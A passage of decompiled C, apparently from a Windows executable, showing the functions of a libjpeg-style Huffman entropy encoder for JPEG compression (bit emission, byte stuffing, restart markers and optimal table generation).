  _memset((void *)(local_118 + 0x400),0,0x100);
  iVar2 = 0;
  local_110 = ((param_2 == '\0') - 1 & 0xffffff10) + 0xff;
  if (0 < local_11c) {
    do {
      uVar4 = (uint)*(byte *)(local_114 + 0x11 + iVar2);
      if ((local_110 < (int)uVar4) || (*(char *)(local_118 + 0x400 + uVar4) != '\0')) {
        *(undefined4 *)(*param_1 + 0x14) = 8;
        (**(code **)*param_1)(param_1);
      }
      *(int *)(local_118 + uVar4 * 4) = aiStack_520[iVar2];
      pcVar3 = local_10c + iVar2;
      iVar2 = iVar2 + 1;
      *(char *)(local_118 + 0x400 + uVar4) = *pcVar3;
    } while (iVar2 < local_11c);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_0040bb8c(void)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  undefined4 *unaff_EDI;
  
  puVar1 = *(undefined4 **)(unaff_EDI[8] + 0x18);
  uVar2 = (*(code *)puVar1[3])(unaff_EDI[8]);
  if ((char)uVar2 == '\0') {
    return uVar2;
  }
  *unaff_EDI = *puVar1;
  uVar2 = puVar1[1];
  unaff_EDI[1] = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



undefined4 __cdecl FUN_0040bbac(uint param_1,int param_2)

{
  int **ppiVar1;
  int **in_EAX;
  int **ppiVar2;
  int *piVar3;
  int *piVar4;
  
  piVar3 = in_EAX[3];
  ppiVar2 = in_EAX;
  if (param_2 == 0) {
    *(undefined4 *)(*in_EAX[8] + 0x14) = 0x28;
    ppiVar2 = (int **)(**(code **)*in_EAX[8])(in_EAX[8]);
  }
  piVar3 = (int *)((int)piVar3 + param_2);
  piVar4 = (int *)(((1 << ((byte)param_2 & 0x1f)) - 1U & param_1) << (0x18U - (char)piVar3 & 0x1f) |
                  (uint)in_EAX[2]);
  while( true ) {
    if ((int)piVar3 < 8) {
      in_EAX[2] = piVar4;
      in_EAX[3] = piVar3;
      return CONCAT31((int3)((uint)ppiVar2 >> 8),1);
    }
    ppiVar2 = (int **)*in_EAX;
    *(char *)ppiVar2 = (char)((uint)piVar4 >> 0x10);
    *in_EAX = (int *)((int)*in_EAX + 1);
    ppiVar1 = in_EAX + 1;
    *ppiVar1 = (int *)((int)*ppiVar1 + -1);
    if ((*ppiVar1 == (int *)0x0) && (ppiVar2 = (int **)FUN_0040bb8c(), (char)ppiVar2 == '\0'))
    break;
    if (((int)piVar4 >> 0x10 & 0xffU) == 0xff) {
      ppiVar2 = (int **)*in_EAX;
      *(undefined *)ppiVar2 = 0;
      *in_EAX = (int *)((int)*in_EAX + 1);
      ppiVar1 = in_EAX + 1;
      *ppiVar1 = (int *)((int)*ppiVar1 + -1);
      if ((*ppiVar1 == (int *)0x0) && (ppiVar2 = (int **)FUN_0040bb8c(), (char)ppiVar2 == '\0'))
      break;
    }
    piVar3 = piVar3 + -2;
    piVar4 = (int *)((int)piVar4 << 8);
  }
  return (uint)ppiVar2 & 0xffffff00;
}



undefined4 FUN_0040bc51(void)

{
  undefined4 uVar1;
  int unaff_ESI;
  
  uVar1 = FUN_0040bbac(0x7f,7);
  if ((char)uVar1 == '\0') {
    return uVar1;
  }
  *(undefined4 *)(unaff_ESI + 8) = 0;
  *(undefined4 *)(unaff_ESI + 0xc) = 0;
  return CONCAT31((int3)((uint)uVar1 >> 8),1);
}



uint __cdecl FUN_0040bc6e(short *param_1,int param_2,int *param_3,uint *param_4)

{
  uint uVar1;
  int unaff_EBX;
  uint uVar2;
  int iVar3;
  int iVar4;
  uint local_8;
  
  uVar2 = *param_1 - param_2;
  uVar1 = uVar2;
  if ((int)uVar2 < 0) {
    uVar1 = -uVar2;
    uVar2 = uVar2 - 1;
  }
  iVar3 = 0;
  if (uVar1 != 0) {
    do {
      iVar3 = iVar3 + 1;
      uVar1 = (int)uVar1 >> 1;
    } while (uVar1 != 0);
    if (0xb < iVar3) {
      *(undefined4 *)(**(int **)(unaff_EBX + 0x20) + 0x14) = 6;
      (**(code **)**(undefined4 **)(unaff_EBX + 0x20))(*(undefined4 **)(unaff_EBX + 0x20));
    }
  }
  uVar1 = FUN_0040bbac(param_3[iVar3],(int)*(char *)(iVar3 + 0x400 + (int)param_3));
  if ((char)uVar1 == '\0') {
LAB_0040bcc5:
    uVar1 = uVar1 & 0xffffff00;
  }
  else {
    if (iVar3 != 0) {
      uVar1 = FUN_0040bbac(uVar2,iVar3);
      if ((char)uVar1 == '\0') goto LAB_0040bcc5;
    }
    iVar3 = 0;
    param_3 = &DAT_00424bbc;
    do {
      uVar1 = *param_3;
      local_8 = (uint)param_1[uVar1];
      if (local_8 == 0) {
        iVar3 = iVar3 + 1;
      }
      else {
        for (; 0xf < iVar3; iVar3 = iVar3 + -0x10) {
          uVar1 = FUN_0040bbac(param_4[0xf0],(int)*(char *)(param_4 + 0x13c));
          if ((char)uVar1 == '\0') goto LAB_0040bcc5;
        }
        uVar1 = local_8;
        if ((int)local_8 < 0) {
          uVar1 = -local_8;
          local_8 = local_8 - 1;
        }
        iVar4 = (int)uVar1 >> 1;
        param_2 = 1;
        if (iVar4 != 0) {
          do {
            param_2 = param_2 + 1;
            iVar4 = iVar4 >> 1;
          } while (iVar4 != 0);
          if (10 < param_2) {
            *(undefined4 *)(**(int **)(unaff_EBX + 0x20) + 0x14) = 6;
            (**(code **)**(undefined4 **)(unaff_EBX + 0x20))(*(undefined4 **)(unaff_EBX + 0x20));
          }
        }
        iVar3 = iVar3 * 0x10 + param_2;
        uVar1 = FUN_0040bbac(param_4[iVar3],(int)*(char *)(iVar3 + 0x400 + (int)param_4));
        if ((char)uVar1 == '\0') goto LAB_0040bcc5;
        uVar1 = FUN_0040bbac(local_8,param_2);
        if ((char)uVar1 == '\0') goto LAB_0040bcc5;
        iVar3 = 0;
      }
      param_3 = param_3 + 1;
    } while ((int)param_3 < 0x424cb8);
    if (0 < iVar3) {
      uVar1 = FUN_0040bbac(*param_4,(int)*(char *)(param_4 + 0x100));
      if ((char)uVar1 == '\0') goto LAB_0040bcc5;
    }
    uVar1 = CONCAT31((int3)(uVar1 >> 8),1);
  }
  return uVar1;
}



uint __cdecl FUN_0040bdd7(char param_1)

{
  char **in_EAX;
  uint uVar1;
  char **ppcVar2;
  int iVar3;
  
  uVar1 = FUN_0040bc51();
  if ((char)uVar1 == '\0') {
LAB_0040bdeb:
    uVar1 = uVar1 & 0xffffff00;
  }
  else {
    **in_EAX = -1;
    *in_EAX = *in_EAX + 1;
    ppcVar2 = in_EAX + 1;
    *ppcVar2 = *ppcVar2 + -1;
    if (*ppcVar2 == (char *)0x0) {
      uVar1 = FUN_0040bb8c();
      if ((char)uVar1 == '\0') goto LAB_0040bdeb;
    }
    **in_EAX = param_1 + -0x30;
    *in_EAX = *in_EAX + 1;
    ppcVar2 = in_EAX + 1;
    *ppcVar2 = *ppcVar2 + -1;
    if (*ppcVar2 == (char *)0x0) {
      uVar1 = FUN_0040bb8c();
      if ((char)uVar1 == '\0') goto LAB_0040bdeb;
    }
    ppcVar2 = (char **)in_EAX[8];
    iVar3 = 0;
    if (0 < (int)ppcVar2[0x39]) {
      ppcVar2 = in_EAX + 4;
      do {
        *ppcVar2 = (char *)0x0;
        iVar3 = iVar3 + 1;
        ppcVar2 = ppcVar2 + 1;
      } while (iVar3 < *(int *)(in_EAX[8] + 0xe4));
    }
    uVar1 = CONCAT31((int3)((uint)ppcVar2 >> 8),1);
  }
  return uVar1;
}



uint __cdecl FUN_0040be43(int param_1,int param_2)

{
  short **ppsVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int *piVar8;
  int *piVar9;
  int local_30 [6];
  int local_18;
  int *local_14;
  int local_10;
  int *local_c;
  int local_8;
  
  iVar4 = *(int *)(param_1 + 0xbc);
  uVar2 = **(undefined4 **)(param_1 + 0x18);
  uVar3 = (*(undefined4 **)(param_1 + 0x18))[1];
  iVar7 = *(int *)(param_1 + 0x15c);
  local_14 = (int *)(iVar7 + 0xc);
  piVar8 = (int *)(iVar7 + 0xc);
  piVar9 = local_30;
  for (iVar6 = 6; iVar6 != 0; iVar6 = iVar6 + -1) {
    *piVar9 = *piVar8;
    piVar8 = piVar8 + 1;
    piVar9 = piVar9 + 1;
  }
  local_10 = iVar7;
  local_18 = param_1;
  if (((iVar4 == 0) || (*(int *)(iVar7 + 0x24) != 0)) ||
     (uVar5 = FUN_0040bdd7((char)*(undefined4 *)(iVar7 + 0x28)), (char)uVar5 != '\0')) {
    local_8 = 0;
    if (0 < *(int *)(param_1 + 0x100)) {
      local_c = (int *)(param_1 + 0x104);
      do {
        iVar7 = *local_c;
        iVar4 = *(int *)(param_1 + 0xe8 + iVar7 * 4);
        ppsVar1 = (short **)(param_2 + local_8 * 4);
        uVar5 = FUN_0040bc6e(*ppsVar1,local_30[iVar7 + 2],
                             *(int **)(local_10 + 0x2c + *(int *)(iVar4 + 0x14) * 4),
                             *(uint **)(local_10 + 0x3c + *(int *)(iVar4 + 0x18) * 4));
        if ((char)uVar5 == '\0') goto LAB_0040be96;
        iVar4 = local_8 + 1;
        local_8 = iVar4;
        local_c = local_c + 1;
        local_30[iVar7 + 2] = (int)**ppsVar1;
      } while (iVar4 < *(int *)(param_1 + 0x100));
    }
    **(undefined4 **)(param_1 + 0x18) = uVar2;
    *(undefined4 *)(*(int *)(param_1 + 0x18) + 4) = uVar3;
    piVar8 = local_30;
    for (iVar7 = 6; iVar7 != 0; iVar7 = iVar7 + -1) {
      *local_14 = *piVar8;
      piVar8 = piVar8 + 1;
      local_14 = local_14 + 1;
    }
    if (*(int *)(param_1 + 0xbc) != 0) {
      if (*(int *)(local_10 + 0x24) == 0) {
        *(int *)(local_10 + 0x24) = *(int *)(param_1 + 0xbc);
        *(uint *)(local_10 + 0x28) = *(int *)(local_10 + 0x28) + 1U & 7;
      }
      *(int *)(local_10 + 0x24) = *(int *)(local_10 + 0x24) + -1;
    }
    uVar5 = CONCAT31((int3)((uint)local_10 >> 8),1);
  }
  else {
LAB_0040be96:
    uVar5 = uVar5 & 0xffffff00;
  }
  return uVar5;
}



void __cdecl FUN_0040bf54(int *param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 local_20 [6];
  int *local_8;
  
  iVar1 = param_1[0x57];
  uVar2 = *(undefined4 *)param_1[6];
  uVar3 = ((undefined4 *)param_1[6])[1];
  puVar6 = (undefined4 *)(iVar1 + 0xc);
  puVar7 = local_20;
  for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  local_8 = param_1;
  uVar4 = FUN_0040bc51();
  if ((char)uVar4 == '\0') {
    *(undefined4 *)(*param_1 + 0x14) = 0x18;
    (**(code **)*param_1)(param_1);
  }
  *(undefined4 *)param_1[6] = uVar2;
  *(undefined4 *)(param_1[6] + 4) = uVar3;
  puVar6 = local_20;
  puVar7 = (undefined4 *)(iVar1 + 0xc);
  for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  return;
}



void __cdecl FUN_0040bfc1(int *param_1,short *param_2,int param_3,int *param_4,int *param_5)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar1 = *param_2 - param_3;
  if (iVar1 < 0) {
    iVar1 = -iVar1;
  }
  iVar3 = 0;
  if (iVar1 != 0) {
    do {
      iVar3 = iVar3 + 1;
      iVar1 = iVar1 >> 1;
    } while (iVar1 != 0);
    if (0xb < iVar3) {
      *(undefined4 *)(*param_1 + 0x14) = 6;
      (**(code **)*param_1)(param_1);
    }
  }
  param_4[iVar3] = param_4[iVar3] + 1;
  iVar1 = 0;
  param_4 = &DAT_00424bbc;
  do {
    iVar3 = (int)param_2[*param_4];
    if (iVar3 == 0) {
      iVar1 = iVar1 + 1;
    }
    else {
      if (0xf < iVar1) {
        iVar2 = (iVar1 - 0x10U >> 4) + 1;
        iVar1 = iVar1 + iVar2 * -0x10;
        param_5[0xf0] = iVar2 + param_5[0xf0];
      }
      if (iVar3 < 0) {
        iVar3 = -iVar3;
      }
      iVar3 = iVar3 >> 1;
      param_3 = 1;
      if (iVar3 != 0) {
        do {
          param_3 = param_3 + 1;
          iVar3 = iVar3 >> 1;
        } while (iVar3 != 0);
        if (10 < param_3) {
          *(undefined4 *)(*param_1 + 0x14) = 6;
          (**(code **)*param_1)(param_1);
        }
      }
      param_5[iVar1 * 0x10 + param_3] = param_5[iVar1 * 0x10 + param_3] + 1;
      iVar1 = 0;
    }
    param_4 = param_4 + 1;
  } while ((int)param_4 < 0x424cb8);
  if (0 < iVar1) {
    *param_5 = *param_5 + 1;
  }
  return;
}



undefined4 __cdecl FUN_0040c094(int *param_1,int param_2)

{
  short **ppsVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  int *in_EAX;
  undefined4 *puVar5;
  int iVar6;
  int *local_8;
  
  piVar4 = param_1;
  iVar3 = param_1[0x57];
  if (param_1[0x2f] != 0) {
    if (*(int *)(iVar3 + 0x24) == 0) {
      iVar6 = 0;
      if (0 < param_1[0x39]) {
        puVar5 = (undefined4 *)(iVar3 + 0x14);
        do {
          *puVar5 = 0;
          iVar6 = iVar6 + 1;
          puVar5 = puVar5 + 1;
        } while (iVar6 < param_1[0x39]);
      }
      in_EAX = (int *)param_1[0x2f];
      *(int **)(iVar3 + 0x24) = in_EAX;
    }
    *(int *)(iVar3 + 0x24) = *(int *)(iVar3 + 0x24) + -1;
  }
  piVar2 = param_1 + 0x40;
  param_1 = (int *)0x0;
  if (0 < *piVar2) {
    local_8 = piVar4 + 0x41;
    do {
      piVar2 = (int *)(iVar3 + 0x14 + *local_8 * 4);
      ppsVar1 = (short **)(param_2 + (int)param_1 * 4);
      FUN_0040bfc1(piVar4,*ppsVar1,*piVar2,
                   *(int **)(iVar3 + 0x4c + *(int *)(piVar4[*local_8 + 0x3a] + 0x14) * 4),
                   *(int **)(iVar3 + 0x5c + *(int *)(piVar4[*local_8 + 0x3a] + 0x18) * 4));
      local_8 = local_8 + 1;
      in_EAX = (int *)((int)param_1 + 1);
      *piVar2 = (int)**ppsVar1;
      param_1 = in_EAX;
    } while ((int)in_EAX < piVar4[0x40]);
  }
  return CONCAT31((int3)((uint)in_EAX >> 8),1);
}



void __cdecl FUN_0040c147(int *param_1,void *param_2,int param_3)

{
  char *pcVar1;
  char cVar2;
  int iVar3;
  void *pvVar4;
  int iVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  int local_840 [257];
  int local_43c [257];
  int *local_38;
  void *local_34;
  undefined4 local_30;
  char local_2c [16];
  char local_1c;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_38 = param_1;
  local_34 = param_2;
  _memset(local_2c,0,0x21);
  _memset(local_43c,0,0x404);
  piVar6 = local_840;
  for (iVar7 = 0x101; iVar7 != 0; iVar7 = iVar7 + -1) {
    *piVar6 = -1;
    piVar6 = piVar6 + 1;
  }
  *(undefined4 *)(param_3 + 0x400) = 1;
  while( true ) {
    iVar7 = -1;
    iVar8 = 1000000000;
    iVar5 = 0;
    do {
      iVar3 = *(int *)(param_3 + iVar5 * 4);
      if ((iVar3 != 0) && (iVar3 <= iVar8)) {
        iVar7 = iVar5;
        iVar8 = iVar3;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 0x101);
    iVar8 = -1;
    local_30 = 1000000000;
    iVar5 = 0;
    do {
      iVar3 = *(int *)(param_3 + iVar5 * 4);
      if (((iVar3 != 0) && (iVar3 <= local_30)) && (iVar5 != iVar7)) {
        local_30 = iVar3;
        iVar8 = iVar5;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 0x101);
    if (iVar8 < 0) break;
    piVar6 = (int *)(param_3 + iVar7 * 4);
    *piVar6 = *piVar6 + *(int *)(iVar8 * 4 + param_3);
    *(undefined4 *)(iVar8 * 4 + param_3) = 0;
    while( true ) {
      local_43c[iVar7] = local_43c[iVar7] + 1;
      if (local_840[iVar7] < 0) break;
      iVar7 = local_840[iVar7];
    }
    local_43c[iVar8] = local_43c[iVar8] + 1;
    local_840[iVar7] = iVar8;
    piVar6 = local_840 + iVar8;
    while (-1 < *piVar6) {
      iVar7 = *piVar6;
      local_43c[iVar7] = local_43c[iVar7] + 1;
      piVar6 = local_840 + iVar7;
    }
  }
  iVar7 = 0;
  do {
    iVar8 = local_43c[iVar7];
    if (iVar8 != 0) {
      if (0x20 < iVar8) {
        *(undefined4 *)(*local_38 + 0x14) = 0x27;
        (**(code **)*local_38)(local_38);
      }
      local_2c[local_43c[iVar7]] = local_2c[local_43c[iVar7]] + '\x01';
    }
    pvVar4 = local_34;
    iVar7 = iVar7 + 1;
  } while (iVar7 < 0x101);
  iVar7 = 0x1e;
  iVar8 = 0x10;
  iVar5 = iVar8;
  do {
    pcVar1 = local_2c + iVar7 + 2;
    while (*pcVar1 != '\0') {
      cVar2 = local_2c[iVar7];
      iVar3 = iVar7;
      while (cVar2 == '\0') {
        cVar2 = local_2c[iVar3 + -1];
        iVar3 = iVar3 + -1;
      }
      *pcVar1 = *pcVar1 + -2;
      local_2c[iVar7 + 1] = local_2c[iVar7 + 1] + '\x01';
      local_2c[iVar3 + 1] = local_2c[iVar3 + 1] + '\x02';
      local_2c[iVar3] = local_2c[iVar3] + -1;
    }
    iVar7 = iVar7 + -1;
    iVar5 = iVar5 + -1;
  } while (iVar5 != 0);
  while (local_1c == '\0') {
    local_1c = local_2c[iVar8 + -1];
    iVar8 = iVar8 + -1;
  }
  local_2c[iVar8] = local_2c[iVar8] + -1;
  _memcpy(local_34,local_2c,0x11);
  iVar7 = 0;
  iVar8 = 1;
  do {
    iVar5 = 0;
    do {
      if (local_43c[iVar5] == iVar8) {
        *(char *)((int)pvVar4 + iVar7 + 0x11) = (char)iVar5;
        iVar7 = iVar7 + 1;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 0x100);
    iVar8 = iVar8 + 1;
  } while (iVar8 < 0x21);
  *(undefined *)((int)pvVar4 + 0x111) = 0;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_0040c320(int *param_1)

{
  void **ppvVar1;
  char *pcVar2;
  int iVar3;
  int *piVar4;
  void *pvVar5;
  char local_1c [4];
  char *local_18;
  char local_14 [4];
  int local_10;
  int local_c;
  int local_8;
  
  piVar4 = param_1;
  local_10 = param_1[0x57];
  _memset(local_14,0,4);
  _memset(local_1c,0,4);
  local_8 = 0;
  if (0 < param_1[0x39]) {
    param_1 = param_1 + 0x3a;
    do {
      iVar3 = *(int *)(*param_1 + 0x14);
      local_c = *(int *)(*param_1 + 0x18);
      local_18 = local_14 + iVar3;
      if (local_14[iVar3] == '\0') {
        ppvVar1 = (void **)(piVar4 + iVar3 + 0x16);
        if (*ppvVar1 == (void *)0x0) {
          pvVar5 = (void *)FUN_00409e11((int)piVar4);
          *ppvVar1 = pvVar5;
        }
        FUN_0040c147(piVar4,*ppvVar1,*(int *)(local_10 + 0x4c + iVar3 * 4));
        *local_18 = '\x01';
      }
      pcVar2 = local_1c + local_c;
      if (*pcVar2 == '\0') {
        ppvVar1 = (void **)(piVar4 + local_c + 0x1a);
        if (*ppvVar1 == (void *)0x0) {
          pvVar5 = (void *)FUN_00409e11((int)piVar4);
          *ppvVar1 = pvVar5;
        }
        FUN_0040c147(piVar4,*ppvVar1,*(int *)(local_10 + 0x5c + local_c * 4));
        *pcVar2 = '\x01';
      }
      local_8 = local_8 + 1;
      param_1 = param_1 + 1;
    } while (local_8 < piVar4[0x39]);
  }
  return;
}



void __cdecl FUN_0040c3ff(int *param_1,char param_2)

{
  void **ppvVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  void *pvVar5;
  int local_10;
  undefined4 *local_c;
  int *local_8;
  
  iVar2 = param_1[0x57];
  if (param_2 == '\0') {
    *(code **)(iVar2 + 4) = FUN_0040be43;
    *(code **)(iVar2 + 8) = FUN_0040bf54;
  }
  else {
    *(code **)(iVar2 + 4) = FUN_0040c094;
    *(code **)(iVar2 + 8) = FUN_0040c320;
  }
  local_10 = 0;
  if (0 < param_1[0x39]) {
    local_c = (undefined4 *)(iVar2 + 0x14);
    local_8 = param_1 + 0x3a;
    do {
      iVar3 = *(int *)(*local_8 + 0x14);
      iVar4 = *(int *)(*local_8 + 0x18);
      if (param_2 == '\0') {
        FUN_0040b971(param_1,'\x01',iVar3,(int *)(iVar2 + 0x2c + iVar3 * 4));
        FUN_0040b971(param_1,'\0',iVar4,(int *)(iVar2 + 0x3c + iVar4 * 4));
      }
      else {
        if ((iVar3 < 0) || (3 < iVar3)) {
          *(undefined4 *)(*param_1 + 0x14) = 0x32;
          *(int *)(*param_1 + 0x18) = iVar3;
          (**(code **)*param_1)(param_1);
        }
        if ((iVar4 < 0) || (3 < iVar4)) {
          *(undefined4 *)(*param_1 + 0x14) = 0x32;
          *(int *)(*param_1 + 0x18) = iVar4;
          (**(code **)*param_1)(param_1);
        }
        ppvVar1 = (void **)(iVar2 + 0x4c + iVar3 * 4);
        if (*ppvVar1 == (void *)0x0) {
          pvVar5 = (void *)(**(code **)param_1[1])(param_1,1,0x404);
          *ppvVar1 = pvVar5;
        }
        _memset(*ppvVar1,0,0x404);
        ppvVar1 = (void **)(iVar2 + 0x5c + iVar4 * 4);
        if (*ppvVar1 == (void *)0x0) {
          pvVar5 = (void *)(**(code **)param_1[1])(param_1,1,0x404);
          *ppvVar1 = pvVar5;
        }
        _memset(*ppvVar1,0,0x404);
      }
      *local_c = 0;
      local_10 = local_10 + 1;
      local_8 = local_8 + 1;
      local_c = local_c + 1;
    } while (local_10 < param_1[0x39]);
  }
  *(undefined4 *)(iVar2 + 0xc) = 0;
  *(undefined4 *)(iVar2 + 0x10) = 0;
  *(int *)(iVar2 + 0x24) = param_1[0x2f];
  *(undefined4 *)(iVar2 + 0x28) = 0;
  return;
}



void __cdecl FUN_0040c567(int param_1)

{
  code **ppcVar1;
  int iVar2;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0x6c);
  *(code ***)(param_1 + 0x15c) = ppcVar1;
  *ppcVar1 = FUN_0040c3ff;
  iVar2 = 4;
  ppcVar1 = ppcVar1 + 0xb;
  do {
    ppcVar1[4] = (code *)0x0;
    *ppcVar1 = (code *)0x0;
    ppcVar1[0xc] = (code *)0x0;
    ppcVar1[8] = (code *)0x0;
    ppcVar1 = ppcVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void FUN_0040c5a0(void)

{
  undefined4 *puVar1;
  char cVar2;
  int unaff_ESI;
  
  puVar1 = *(undefined4 **)(*(int *)(unaff_ESI + 0x20) + 0x18);
  cVar2 = (*(code *)puVar1[3])(*(int *)(unaff_ESI + 0x20));
  if (cVar2 == '\0') {
    *(undefined4 *)(**(int **)(unaff_ESI + 0x20) + 0x14) = 0x18;
    (**(code **)**(undefined4 **)(unaff_ESI + 0x20))(*(undefined4 **)(unaff_ESI + 0x20));
  }
  *(undefined4 *)(unaff_ESI + 0x10) = *puVar1;
  *(undefined4 *)(unaff_ESI + 0x14) = puVar1[1];
  return;
}



void __cdecl FUN_0040c5d2(uint param_1,uint param_2)

{
  int *piVar1;
  int iVar2;
  int in_EAX;
  uint uVar3;
  uint uVar4;
  
  iVar2 = *(int *)(in_EAX + 0x1c);
  if (param_2 == 0) {
    *(undefined4 *)(**(int **)(in_EAX + 0x20) + 0x14) = 0x28;
    (**(code **)**(undefined4 **)(in_EAX + 0x20))(*(undefined4 **)(in_EAX + 0x20));
  }
  if (*(char *)(in_EAX + 0xc) == '\0') {
    uVar3 = iVar2 + param_2;
    uVar4 = ((1 << ((byte)param_2 & 0x1f)) - 1U & param_1) << (0x18U - (char)uVar3 & 0x1f) |
            *(uint *)(in_EAX + 0x18);
    if (7 < (int)uVar3) {
      param_2 = uVar3 >> 3;
      uVar3 = uVar3 + param_2 * -8;
      do {
        **(undefined **)(in_EAX + 0x10) = (char)(uVar4 >> 0x10);
        *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + 1;
        piVar1 = (int *)(in_EAX + 0x14);
        *piVar1 = *piVar1 + -1;
        if (*piVar1 == 0) {
          FUN_0040c5a0();
        }
        if (((int)uVar4 >> 0x10 & 0xffU) == 0xff) {
          **(undefined **)(in_EAX + 0x10) = 0;
          *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + 1;
          piVar1 = (int *)(in_EAX + 0x14);
          *piVar1 = *piVar1 + -1;
          if (*piVar1 == 0) {
            FUN_0040c5a0();
          }
        }
        uVar4 = uVar4 << 8;
        param_2 = param_2 - 1;
      } while (param_2 != 0);
    }
    *(uint *)(in_EAX + 0x18) = uVar4;
    *(uint *)(in_EAX + 0x1c) = uVar3;
  }
  return;
}



void FUN_0040c67a(void)

{
  int unaff_ESI;
  
  FUN_0040c5d2(0x7f,7);
  *(undefined4 *)(unaff_ESI + 0x18) = 0;
  *(undefined4 *)(unaff_ESI + 0x1c) = 0;
  return;
}



void __fastcall FUN_0040c690(int param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  int in_EAX;
  
  if (*(char *)(in_EAX + 0xc) != '\0') {
    piVar1 = (int *)(*(int *)(in_EAX + 0x5c + param_1 * 4) + param_2 * 4);
    *piVar1 = *piVar1 + 1;
    return;
  }
  iVar2 = *(int *)(in_EAX + 0x4c + param_1 * 4);
  FUN_0040c5d2(*(uint *)(iVar2 + param_2 * 4),(int)*(char *)(iVar2 + 0x400 + param_2));
  return;
}



void __cdecl FUN_0040c6ba(int param_1)

{
  char *in_EAX;
  int unaff_ESI;
  
  if ((*(char *)(unaff_ESI + 0xc) == '\0') && (param_1 != 0)) {
    do {
      FUN_0040c5d2((int)*in_EAX,1);
      in_EAX = in_EAX + 1;
      param_1 = param_1 + -1;
    } while (param_1 != 0);
  }
  return;
}



void FUN_0040c6e2(void)

{
  int in_EAX;
  int iVar1;
  uint uVar2;
  
  if (*(int *)(in_EAX + 0x38) != 0) {
    uVar2 = 0;
    iVar1 = *(int *)(in_EAX + 0x38) >> 1;
    if (iVar1 != 0) {
      do {
        uVar2 = uVar2 + 1;
        iVar1 = iVar1 >> 1;
      } while (iVar1 != 0);
      if (0xe < (int)uVar2) {
        *(undefined4 *)(**(int **)(in_EAX + 0x20) + 0x14) = 0x28;
        (**(code **)**(undefined4 **)(in_EAX + 0x20))(*(undefined4 **)(in_EAX + 0x20));
      }
    }
    FUN_0040c690(*(int *)(in_EAX + 0x34),uVar2 << 4);
    if (uVar2 != 0) {
      FUN_0040c5d2(*(uint *)(in_EAX + 0x38),uVar2);
    }
    *(undefined4 *)(in_EAX + 0x38) = 0;
    FUN_0040c6ba(*(int *)(in_EAX + 0x3c));
    *(undefined4 *)(in_EAX + 0x3c) = 0;
  }
  return;
}



void __cdecl FUN_0040c749(char param_1)

{
  int *piVar1;
  int in_EAX;
  undefined4 *puVar2;
  int iVar3;
  
  FUN_0040c6e2();
  if (*(char *)(in_EAX + 0xc) == '\0') {
    FUN_0040c67a();
    **(undefined **)(in_EAX + 0x10) = 0xff;
    *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + 1;
    piVar1 = (int *)(in_EAX + 0x14);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_0040c5a0();
    }
    **(char **)(in_EAX + 0x10) = param_1 + -0x30;
    *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + 1;
    piVar1 = (int *)(in_EAX + 0x14);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_0040c5a0();
    }
  }
  if (*(int *)(*(int *)(in_EAX + 0x20) + 300) == 0) {
    iVar3 = 0;
    if (0 < *(int *)(*(int *)(in_EAX + 0x20) + 0xe4)) {
      puVar2 = (undefined4 *)(in_EAX + 0x24);
      do {
        *puVar2 = 0;
        iVar3 = iVar3 + 1;
        puVar2 = puVar2 + 1;
      } while (iVar3 < *(int *)(*(int *)(in_EAX + 0x20) + 0xe4));
    }
  }
  else {
    *(undefined4 *)(in_EAX + 0x38) = 0;
    *(undefined4 *)(in_EAX + 0x3c) = 0;
  }
  return;
}



undefined4 __cdecl FUN_0040c7c1(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  int iVar6;
  uint uVar7;
  byte local_14;
  int *local_10;
  uint local_c;
  int local_8;
  
  piVar5 = param_1;
  iVar2 = param_1[0x4e];
  iVar3 = param_1[0x57];
  *(undefined4 *)(iVar3 + 0x10) = *(undefined4 *)param_1[6];
  *(undefined4 *)(iVar3 + 0x14) = *(undefined4 *)(param_1[6] + 4);
  if ((param_1[0x2f] != 0) && (*(int *)(iVar3 + 0x44) == 0)) {
    FUN_0040c749((char)*(undefined4 *)(iVar3 + 0x48));
  }
  local_8 = 0;
  if (0 < param_1[0x40]) {
    local_10 = param_1 + 0x41;
    do {
      local_14 = (byte)iVar2;
      iVar4 = piVar5[*local_10 + 0x3a];
      iVar6 = (int)**(short **)(param_2 + local_8 * 4) >> (local_14 & 0x1f);
      piVar1 = (int *)(iVar3 + 0x24 + *local_10 * 4);
      local_c = iVar6 - *piVar1;
      *piVar1 = iVar6;
      uVar7 = local_c;
      if ((int)local_c < 0) {
        uVar7 = -local_c;
        local_c = local_c - 1;
      }
      param_1 = (int *)0x0;
      if (uVar7 != 0) {
